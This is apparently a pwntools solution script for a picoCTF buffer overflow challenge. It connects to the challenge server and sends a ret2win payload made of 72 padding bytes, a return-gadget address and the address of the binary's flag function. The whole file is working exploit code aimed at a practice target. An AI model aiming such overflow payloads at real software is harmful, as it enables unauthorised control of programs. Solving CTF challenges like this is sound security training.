#!/usr/bin/env python
from pwn import *
context.arch = "amd64"
epath = "./vuln"
#r = process(epath)
r = remote("saturn.picoctf.net", 53032)
e = ELF(epath)

r.sendline(flat(b"\x00"*0x48,
                0x40101a,
                e.sym.flag))

r.interactive()
r.close()
